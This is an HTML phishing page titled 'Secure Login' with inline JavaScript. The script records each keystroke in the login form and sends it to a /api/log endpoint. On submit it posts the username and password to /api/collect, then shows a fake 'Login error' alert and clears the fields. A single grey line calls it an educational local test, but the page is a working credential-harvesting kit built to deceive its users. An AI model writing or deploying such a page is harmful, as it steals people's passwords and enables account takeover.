<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
    <h2>Please Sign In</h2>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username" style="display:block; margin:10px;">
        <input type="password" id="password" placeholder="Password" style="display:block; margin:10px;">
        <button type="submit">Log In</button>
    </form>
    <p style="color:gray; font-size:12px;">(Educational local test - credentials will print to terminal)</p>

    <script>
        // Keylogger capture for local testing
        document.addEventListener('keyup', function(e) {
            if (e.target.closest('#loginForm')) {
                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: e.key, target: e.target.id })
                });
            }
        });

        // Final submit capture
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: username, pass: password })
            }).then(() => {
                alert("Login error. Please try again."); // Simulated failure
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            });
        });
    </script>
</body>
</html>
